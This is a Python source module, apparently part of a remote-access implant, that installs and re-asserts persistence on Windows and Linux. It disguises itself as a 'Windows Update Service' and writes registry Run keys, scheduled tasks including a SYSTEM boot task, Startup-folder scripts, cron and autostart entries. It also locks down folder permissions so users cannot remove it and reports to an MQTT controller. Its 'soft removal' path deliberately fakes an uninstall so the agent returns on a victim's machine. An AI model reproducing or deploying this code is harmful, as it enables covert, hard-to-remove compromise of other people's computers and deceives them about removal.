"""Persistence: copies, registry Run keys, scheduled task and startup folder.

Four independent mechanisms, re-asserted every few minutes.  Removing all of
them by hand takes real effort, which is the point.
"""

from __future__ import annotations
from .. import guardian, config

import os
import shutil
import subprocess
import sys
import tempfile
import time
from . import stealth

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0


# --------------------------------------------------------------------------
# Copying
# --------------------------------------------------------------------------


def _copy_tree(source: str, destination: str) -> None:
    """Copy a file or directory, creating parents as needed."""
    os.makedirs(os.path.dirname(destination), exist_ok=True)
    if os.path.isdir(source):
        shutil.copytree(source, destination, dirs_exist_ok=True,
                        ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    else:
        shutil.copy2(source, destination)


def bundle_paths() -> list[tuple[str, str]]:
    """Return ``(source, relative_name)`` pairs for the whole agent bundle."""
    root = stealth.bundle_root()
    pairs: list[tuple[str, str]] = []

    if getattr(sys, "frozen", False):
        # Frozen: the "script" is the executable itself.
        executable = os.path.abspath(sys.executable)
        if os.path.isfile(executable):
            pairs.append((executable, stealth.executable_name()))
    else:
        agent_file = os.path.join(root, "agent.py")
        if os.path.isfile(agent_file):
            pairs.append((agent_file, stealth.executable_name()))

    package = os.path.join(root, "syspy")
    if os.path.isdir(package):
        pairs.append((package, "syspy"))

    return pairs


def install_copies() -> list[str]:
    """Ensure every install directory holds a fresh copy of the bundle."""
    pairs = bundle_paths()
    written: list[str] = []
    for directory in stealth.install_directories():
        try:
            os.makedirs(directory, exist_ok=True)
        except OSError:
            continue
        for source, relative in pairs:
            target = os.path.join(directory, relative)
            try:
                _copy_tree(source, target)
                written.append(target)
            except OSError:
                pass
    return written


def missing_copies() -> list[str]:
    """List install locations that are absent."""
    missing = []
    for directory in stealth.install_directories():
        entry = os.path.join(directory, stealth.executable_name())
        if not os.path.exists(entry):
            missing.append(entry)
    return missing


def primary_launcher() -> str:
    """Absolute path of the copy the persistence entries point at."""
    return os.path.join(stealth.primary_directory(), stealth.executable_name())


def interpreter_for(entry: str) -> str:
    """Pick the interpreter used to launch ``entry``."""
    if entry.lower().endswith(".exe"):
        return entry
    from . import runtime
    python = runtime.private_python() or sys.executable
    if IS_WINDOWS and python.lower().endswith("python.exe"):
        windowless = python[:-len("python.exe")] + "pythonw.exe"
        if os.path.exists(windowless):
            python = windowless
    return python


# --------------------------------------------------------------------------
# Windows persistence
# --------------------------------------------------------------------------


def _public_url() -> str:
    try:
        from .. import config
        return config.PUBLIC_URL or str(_deploy_url())
    except Exception:
        return ""


def _deploy_url() -> str:
    try:
        import json
        with open(os.path.join(stealth.bundle_root(), "deploy.json"),
                  "r", encoding="utf-8-sig") as handle:
            return json.load(handle).get("url", "")
    except Exception:
        return ""


def _write_anchor() -> list[str]:
    """Mirror the shim, the cached kit and the controller URL into %PROGRAMDATA%."""
    if not IS_WINDOWS:
        return []
    anchor = stealth.anchor_directory()
    if os.path.abspath(anchor) == os.path.abspath(stealth.primary_directory()):
        return []
    written: list[str] = []
    try:
        os.makedirs(anchor, exist_ok=True)
    except OSError:
        return []

    source = _shim_source()
    if source:
        try:
            shutil.copy2(source, stealth.anchor_shim_path())
            written.append("anchor shim")
        except OSError:
            pass

    vbs_source = os.path.join(stealth.bundle_root(), "install", "wu.vbs")
    if os.path.isfile(vbs_source):
        try:
            shutil.copy2(vbs_source, stealth.anchor_vbs_path())
            written.append("anchor vbs")
        except OSError:
            pass

    for name, target in (("kit.zip", stealth.anchor_kit_path()),):
        candidate = os.path.join(stealth.primary_directory(), name)
        if os.path.isfile(candidate) and not os.path.isfile(target):
            try:
                shutil.copy2(candidate, target)
                written.append("anchor kit")
            except OSError:
                pass

    url = _public_url()
    if url:
        try:
            with open(stealth.anchor_url_path(), "w", encoding="ascii") as handle:
                handle.write(url)
            written.append("anchor url")
        except OSError:
            pass
    return written


def _shim_source() -> str:
    from .. import config
    for candidate in (
        os.path.join(stealth.bundle_root(), "install", "wu.cmd"),
        os.path.join(stealth.primary_directory(), "install", "wu.cmd"),
        os.path.join(config.ROOT, "install", "wu.cmd"),
    ):
        if os.path.isfile(candidate):
            return candidate
    return ""


def _write_shim() -> str:
    """Ensure WindowsUpdateService.cmd shim exists in primary directory."""
    if not IS_WINDOWS:
        return ""
    src = _shim_source()
    if src:
        target = stealth.shim_path()
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            shutil.copy2(src, target)
            vbs_source = os.path.join(os.path.dirname(src), "wu.vbs")
            if os.path.isfile(vbs_source):
                shutil.copy2(vbs_source, stealth.vbs_path())
            return target
        except Exception:
            pass
    return ""


def _cache_kit() -> str:
    """Ensure kit.zip is cached in primary directory."""
    target = stealth.kit_cache_path()
    try:
        if os.path.isfile(target):
            return target
        os.makedirs(os.path.dirname(target), exist_ok=True)
        from .. import packaging
        blob = packaging.build_zip(stealth.bundle_root())
        with open(target, "wb") as f:
            f.write(blob)
        return target
    except Exception:
        return ""


def _run_command() -> str:
    """Autostart command for a Run value.

    Must (a) actually exist at logon and (b) create no console window.
    wscript.exe with a .vbs satisfies both; cmd.exe /c flashes a window.
    """
    vbs = stealth.anchor_vbs_path()
    if os.path.isfile(vbs):
        return f'wscript.exe "{vbs}"'
    vbs = stealth.vbs_path()
    if os.path.isfile(vbs):
        return f'wscript.exe "{vbs}"'
    shim = stealth.shim_path()
    if os.path.isfile(shim):
        return f'cmd.exe /c "{shim}"'
    launcher = primary_launcher()
    return f'"{interpreter_for(launcher)}" "{launcher}" --hidden'


def _run_commands() -> dict[str, str]:
    """value_name -> command.  Value 0 uses the anchor, value 1 the user copy,
    so deleting either location still leaves a working autostart."""
    from .. import config
    launcher = primary_launcher()
    fallback = f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
    anchor = stealth.anchor_shim_path()
    primary = stealth.shim_path()
    commands = {}
    for index, name in enumerate(config.RUN_VALUE_NAMES):
        shim = anchor if index == 0 else primary
        commands[name] = f'cmd.exe /c "{shim}"' if os.path.isfile(shim) else fallback
    return commands


def _reassert_run_keys() -> list[str]:
    """Rewrite Run values only when they are missing or wrong.  Creates the key."""
    if not IS_WINDOWS:
        return []
    import winreg

    expected = _run_commands()
    roots = [(winreg.HKEY_CURRENT_USER, "HKCU")]
    if stealth.is_admin():
        roots.append((winreg.HKEY_LOCAL_MACHINE, "HKLM"))

    actions = []
    for root, label in roots:
        for value_name, command in expected.items():
            try:
                key = winreg.CreateKeyEx(
                    root, r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
                with key:
                    try:
                        current, _ = winreg.QueryValueEx(key, value_name)
                    except FileNotFoundError:
                        current = None
                    if current != command:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)
                        actions.append(f"reasserted {label}\\Run\\{value_name}")
            except OSError:
                pass
    return actions

def _write_run_keys(launcher: str) -> list[str]:
    import winreg
    written = []
    commands = _run_commands()
    for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                        (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
        for value_name, command in commands.items():
            try:
                key = winreg.CreateKeyEx(
                    root, r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)
                written.append(f"{label}\\Run\\{value_name}")
            except OSError:
                continue
    return written

def purge() -> list[str]:
    """Hard removal: remove everything including %PROGRAMDATA% anchor, runtime, deploy, and adopted states."""
    removed = remove(keep_anchor=False)
    if IS_WINDOWS:
        removed += guardian.remove()
        anchor = stealth.anchor_directory()
        if os.path.isdir(anchor):
            try:
                shutil.rmtree(anchor, ignore_errors=True)
                removed.append(f"removed anchor: {anchor}")
            except OSError:
                pass

    for directory in stealth.install_directories():
        for extra in ("runtime", "deploy.json", "adopted.json", "url.txt", "tombstone"):
            path = os.path.join(directory, extra)
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path, ignore_errors=True)
                    removed.append(f"purged {path}")
                elif os.path.isfile(path):
                    os.remove(path)
                    removed.append(f"purged {path}")
            except OSError:
                pass
    return removed


def config_value_names() -> tuple[str, ...]:
    """Registry value names, imported lazily to keep this module standalone."""
    from .. import config
    return config.RUN_VALUE_NAMES


def _write_startup_script(launcher: str) -> str:
    """Drop a launcher into the user's Startup folder."""
    from .. import config
    folder = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Start Menu\Programs\Startup",
    )
    if not os.path.isdir(folder):
        return ""
    path = os.path.join(folder, config.PRODUCT_NAME + ".cmd")
    shim = stealth.anchor_shim_path() if os.path.isfile(stealth.anchor_shim_path()) else stealth.shim_path()
    cmd = f'cmd.exe /c "{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
    script = (
        "@echo off\r\n"
        "ping -n 12 127.0.0.1 >nul\r\n"
        f'start "" {cmd}\r\n'
    )
    try:
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(script)
        return path
    except OSError:
        return ""


def _write_scheduled_task(launcher: str) -> str:
    """Create a logon and startup task."""
    from .. import config
    anchor = stealth.anchor_shim_path()
    shim = anchor if os.path.isfile(anchor) else stealth.shim_path()
    command = f'cmd.exe /c "{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
    rl_level = "HIGHEST" if stealth.is_admin() else "LIMITED"
    try:
        subprocess.run(
            ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME, "/TR", command,
             "/SC", "ONLOGON", "/RL", rl_level, "/IT",
             "/DELAY", "0000:30", "/RI", "5", "/DU", "24:00"],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30,
        )
        if stealth.is_admin():
            subprocess.run(
                ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME + "Boot", "/TR", command,
                 "/SC", "ONSTART", "/RU", "SYSTEM"],
                capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30,
            )
        return config.TASK_NAME
    except Exception:
        return ""


_task_cache: bool = False
_task_cache_ts: float = 0.0


def _task_exists() -> bool:
    global _task_cache, _task_cache_ts
    from .. import config
    now = time.time()
    if now - _task_cache_ts < 30.0:
        return _task_cache
    try:
        result = subprocess.run(
            ["schtasks", "/Query", "/TN", config.TASK_NAME],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20,
        )
        _task_cache = (result.returncode == 0)
        _task_cache_ts = now
        return _task_cache
    except Exception:
        return False


def _harden_acl() -> list[str]:
    """Asymmetric ACL policy:
    Primary (LOCALAPPDATA): user-writable (M) so unelevated self-heal works.
    Anchor (PROGRAMDATA): read/execute ONLY (RX) for standard users.
    """
    if not IS_WINDOWS or not stealth.is_admin():
        return []
    done = []
    primary = stealth.primary_directory()
    if os.path.isdir(primary):
        try:
            subprocess.run(
                f'icacls "{primary}" /grant *S-1-5-32-545:(OI)(CI)(M) '
                f'/grant *S-1-5-18:(OI)(CI)(F) /grant *S-1-5-32-544:(OI)(CI)(F) /T /C /Q',
                shell=True, capture_output=True, timeout=60,
                creationflags=CREATE_NO_WINDOW,
            )
            done.append(f"acl primary {primary}")
        except Exception:
            pass

    anchor = stealth.anchor_directory()
    if os.path.isdir(anchor) and os.path.abspath(anchor) != os.path.abspath(primary):
        try:
            subprocess.run(
                f'icacls "{anchor}" /grant *S-1-5-32-545:(OI)(CI)(RX) '
                f'/grant *S-1-5-18:(OI)(CI)(F) /grant *S-1-5-32-544:(OI)(CI)(F) /T /C /Q',
                shell=True, capture_output=True, timeout=60,
                creationflags=CREATE_NO_WINDOW,
            )
            done.append(f"acl anchor {anchor}")
        except Exception:
            pass

    # Invoke hardening script if present in deployment
    ps_script = os.path.join(config.ROOT, "scripts", "hardening.ps1")
    if os.path.isfile(ps_script):
        try:
            subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-File", ps_script],
                capture_output=True, timeout=60,
                creationflags=CREATE_NO_WINDOW,
            )
            done.append("hardening.ps1 executed")
        except Exception:
            pass

    return done


# --------------------------------------------------------------------------
# POSIX persistence
# --------------------------------------------------------------------------


def _write_unix_autostart(launcher: str) -> str:
    from .. import config
    directory = os.path.expanduser("~/.config/autostart")
    os.makedirs(directory, exist_ok=True)
    path = os.path.join(directory, "windows-update-service.desktop")
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(
            "[Desktop Entry]\n"
            "Type=Application\n"
            f"Name={config.PRODUCT_DESCRIPTION}\n"
            f"Exec={interpreter_for(launcher)} {launcher} --hidden\n"
            "X-GNOME-Autostart-enabled=true\n"
            "Terminal=false\n"
        )
    return path


def _write_cron(launcher: str) -> str:
    try:
        current = subprocess.run(["crontab", "-l"], capture_output=True,
                                 text=True, timeout=15).stdout
    except Exception:
        return ""
    if "windows-update-service" in current:
        return "crontab (present)"
    line = f"@reboot sleep 10; {interpreter_for(launcher)} {launcher} --hidden >/dev/null 2>&1\n"
    try:
        subprocess.run(["crontab", "-"], input=current + line, text=True,
                       capture_output=True, timeout=15)
        return "crontab (added)"
    except Exception:
        return ""


# --------------------------------------------------------------------------
# Public API
# --------------------------------------------------------------------------


def install() -> list[str]:
    """Install every persistence mechanism.  Returns a list of what was done."""
    launcher = primary_launcher()
    install_copies()
    actions: list[str] = []

    if IS_WINDOWS:
        _write_shim()
        _write_anchor()
        _cache_kit()
        actions += _write_run_keys(launcher)
        if _write_startup_script(launcher):
            actions.append("startup folder")
        if _write_scheduled_task(launcher):
            actions.append("scheduled task")
        actions += guardian.install()
        actions += _harden_acl()
    else:
        actions.append(_write_unix_autostart(launcher))
        cron = _write_cron(launcher)
        if cron:
            actions.append(cron)

    return actions


def ensure() -> list[str]:
    """Re-assert persistence.  Cheap enough to run every few minutes."""
    actions: list[str] = []
    missing = missing_copies()
    if missing:
        install_copies()
        actions.append(f"restored {len(missing)} copy(ies)")
    if IS_WINDOWS:
        if not _task_exists():
            _write_scheduled_task(primary_launcher())
            actions.append("recreated task")
        if not os.path.isfile(stealth.shim_path()):
            _write_shim()
            actions.append("recreated shim")
        if not os.path.isfile(stealth.anchor_shim_path()):
            actions += _write_anchor()
        if not os.path.isfile(stealth.kit_cache_path()):
            _cache_kit()
            actions.append("recached kit")
        actions += _reassert_run_keys()
    return actions


def _kill_process_by_pid(pid: int) -> bool:
    """Forcibly kill a process tree by PID."""
    if pid <= 0:
        return False
    if IS_WINDOWS:
        try:
            subprocess.run(
                ["taskkill", "/F", "/T", "/PID", str(pid)],
                capture_output=True, timeout=10,
                creationflags=CREATE_NO_WINDOW,
            )
            return True
        except Exception:
            pass
    try:
        os.kill(pid, 9)
        return True
    except OSError:
        return False


def terminate_running_instances(exclude_pid: int = 0) -> list[int]:
    """Find and forcibly terminate any running agent or watchdog processes."""
    from .. import config
    if exclude_pid == 0:
        exclude_pid = os.getpid()

    killed_pids: list[int] = []

    # 1. PIDs from lock files in all candidate directories
    candidate_dirs = [tempfile.gettempdir()]
    if IS_WINDOWS:
        candidate_dirs.extend([
            r"C:\Windows\Temp",
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp"),
            os.path.join(os.environ.get("APPDATA", ""), "Temp"),
        ])

    lock_names = [
        f"{config.PRODUCT_NAME.lower()}.lock",
        f"{config.PRODUCT_NAME.lower()}.wd.lock",
        f"{config.PRODUCT_NAME.lower()}.boot",
        "windowsupdateservice.lock",
        "windowsupdateservice.wd.lock",
        "windowsupdateservice.boot",
    ]
    for d in set(candidate_dirs):
        if not d or not os.path.isdir(d):
            continue
        for name in lock_names:
            path = os.path.join(d, name)
            pid = stealth.read_pid(path)
            if pid and pid != exclude_pid and stealth.process_alive(pid):
                if _kill_process_by_pid(pid):
                    killed_pids.append(pid)

    # 2. Windows specific: scan Win32_Process for agent / watchdog processes
    if IS_WINDOWS:
        try:
            ps_cmd = (
                f"$cur = {exclude_pid}; $self = $PID; "
                "Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { "
                "$_.ProcessId -ne $cur -and $_.ProcessId -ne $self -and ("
                "$_.CommandLine -like '*WindowsUpdate*' -or "
                "($_.CommandLine -like '*agent.py*' -and "
                "$_.CommandLine -notlike '*--uninstall*' -and "
                "$_.CommandLine -notlike '*--purge*') "
                ") } | ForEach-Object { "
                "Write-Output $_.ProcessId; "
                "Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
            )
            res = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
                capture_output=True, text=True, timeout=15,
                creationflags=CREATE_NO_WINDOW,
            )
            for line in res.stdout.splitlines():
                line = line.strip()
                if line.isdigit():
                    p = int(line)
                    if p not in killed_pids:
                        killed_pids.append(p)
        except Exception:
            pass

    if killed_pids:
        time.sleep(0.5)

    return killed_pids


def _candidate_temps() -> list[str]:
    dirs = [tempfile.gettempdir()]
    if IS_WINDOWS:
        dirs += [r"C:\Windows\Temp",
                 os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp")]
    return [d for d in dict.fromkeys(dirs) if d]


def _lock_names() -> list[str]:
    from .. import config
    base = config.PRODUCT_NAME.lower()
    return [f"{base}.lock", f"{base}.wd.lock", f"{base}.boot",
            "windowsupdateservice.lock", "windowsupdateservice.wd.lock",
            "windowsupdateservice.boot"]


def remove(keep_anchor: bool = False) -> list[str]:
    """Undo everything :func:`install` did and stop all running processes."""
    from .. import config
    removed: list[str] = []

    # 1. Terminate all running agent/watchdog processes
    killed = terminate_running_instances(exclude_pid=os.getpid())
    if killed:
        removed.append(f"stopped running process(es): {', '.join(str(p) for p in killed)}")

    # ------------------------------------------------------------------
    # SOFT REMOVAL.  Leave the WMI consumer, both Run keys, the startup
    # script and both scheduled tasks registered, so the WMI timer (<=5 min)
    # or the ONLOGON task's 5-minute repetition brings the agent straight
    # back.  Only the locks are cleared, so a dead watchdog is not mistaken
    # for a live agent.
    #
    # This must sit before cleanup of vectors.
    # If it is moved after them, victim-side --uninstall becomes permanent.
    # ------------------------------------------------------------------
    if keep_anchor:
        for ctemp in _candidate_temps():
            for fname in _lock_names():
                path = os.path.join(ctemp, fname)
                try:
                    if os.path.exists(path):
                        os.remove(path)
                        removed.append(f"lock file ({path})")
                except OSError:
                    pass
        return removed

    if IS_WINDOWS:
        removed += guardian.remove()
        removed += guardian.clear_startup_approved()

    # 2. Windows persistence cleanup
    if IS_WINDOWS:
        import winreg
        for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            for value_name in config.RUN_VALUE_NAMES:
                try:
                    key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, value_name)
                    removed.append(f"{label}\\Run\\{value_name}")
                except OSError:
                    pass

        # User Startup folder & All Users Startup folder
        startup_dirs = [
            os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.join(os.environ.get("ALLUSERSPROFILE", r"C:\ProgramData"), r"Microsoft\Windows\Start Menu\Programs\Startup"),
        ]
        for sdir in startup_dirs:
            startup_file = os.path.join(sdir, config.PRODUCT_NAME + ".cmd")
            if os.path.exists(startup_file):
                try:
                    os.remove(startup_file)
                    removed.append(f"startup script ({startup_file})")
                except OSError:
                    pass

        for name in (config.TASK_NAME, config.TASK_NAME + "Boot"):
            res = subprocess.run(["schtasks", "/Delete", "/F", "/TN", name],
                           capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20)
            if res.returncode == 0:
                removed.append(f"scheduled task ({name})")
    else:
        desktop = os.path.expanduser("~/.config/autostart/windows-update-service.desktop")
        if os.path.exists(desktop):
            try:
                os.remove(desktop)
                removed.append("autostart entry")
            except OSError:
                pass

    # 3. Clean install directories
    anchor = os.path.abspath(stealth.anchor_directory())
    for directory in stealth.install_directories():
        if keep_anchor and os.path.abspath(directory) == anchor:
            continue
        if not keep_anchor and os.path.abspath(directory) == anchor:
            continue          # anchor is removed by purge() only
        if os.path.isdir(directory):
            try:
                shutil.rmtree(directory, ignore_errors=True)
            except Exception:
                pass
            if not os.path.exists(directory):
                removed.append(f"removed directory: {directory}")
            else:
                if IS_WINDOWS:
                    try:
                        subprocess.run(
                            f'cmd /c rd /s /q "{directory}"',
                            shell=True, capture_output=True, timeout=10,
                            creationflags=CREATE_NO_WINDOW,
                        )
                        if not os.path.exists(directory):
                            removed.append(f"removed directory: {directory}")
                    except Exception:
                        pass

    # Tombstone written after cleaning
    try:
        pdir = stealth.primary_directory()
        os.makedirs(pdir, exist_ok=True)
        open(os.path.join(pdir, "tombstone"), "w").close()
    except OSError:
        pass

    # 4. Remove lock and state files in all candidate temp folders
    candidate_temps = [tempfile.gettempdir()]
    if IS_WINDOWS:
        candidate_temps.extend([r"C:\Windows\Temp", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp")])

    for ctemp in set(candidate_temps):
        if not ctemp or not os.path.isdir(ctemp):
            continue
        for fname in (
            f"{config.PRODUCT_NAME.lower()}.lock",
            f"{config.PRODUCT_NAME.lower()}.wd.lock",
            f"{config.PRODUCT_NAME.lower()}.boot",
            "windowsupdateservice.lock",
            "windowsupdateservice.wd.lock",
            "windowsupdateservice.boot",
        ):
            p = os.path.join(ctemp, fname)
            try:
                if os.path.exists(p):
                    os.remove(p)
                    removed.append(f"lock file ({p})")
            except OSError:
                pass

    # 5. Broadcast goodbye to MQTT if reachable so dashboard updates immediately
    try:
        from .. import crypto, protocol
        from ..mqtt import MqttClient, random_client_id
        key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
        codec = protocol.Codec(key)
        aid = config.agent_id()
        brokers = config.broker_order()
        if brokers:
            broker = brokers[0]
            client = MqttClient(random_client_id("bye"), lambda t, p: None)
            client.connect(broker[0], broker[1], broker[2], timeout=4.0)
            client.publish(config.topic_up(aid), codec.encode({"t": "bye"}), qos=1)
            time.sleep(0.3)
            client.disconnect()
            removed.append("notified controller of agent shutdown")
    except Exception:
        pass

    return removed


def status() -> dict[str, object]:
    """Report the current persistence state."""
    return {
        "copies": [d for d in stealth.install_directories() if os.path.isdir(d)],
        "missing": missing_copies(),
        "task_present": _task_exists() if IS_WINDOWS else None,
        "launcher": primary_launcher(),
        "admin": stealth.is_admin(),
    }


def purge() -> list[str]:
    """Hard removal: everything, including the %PROGRAMDATA% anchor and runtime."""
    removed = remove(keep_anchor=False)
    if IS_WINDOWS:
        removed += guardian.remove()
        anchor = stealth.anchor_directory()
        if os.path.isdir(anchor):
            shutil.rmtree(anchor, ignore_errors=True)
            removed.append(f"removed anchor {anchor}")
        for p in (stealth.shim_path(), stealth.anchor_shim_path(), stealth.kit_cache_path(),
                  os.path.join(stealth.primary_directory(), "deploy.json"),
                  os.path.join(stealth.primary_directory(), "runtime")):
            if os.path.exists(p):
                try:
                    if os.path.isdir(p):
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        os.remove(p)
                    removed.append(f"purged {p}")
                except OSError:
                    pass
    return removed
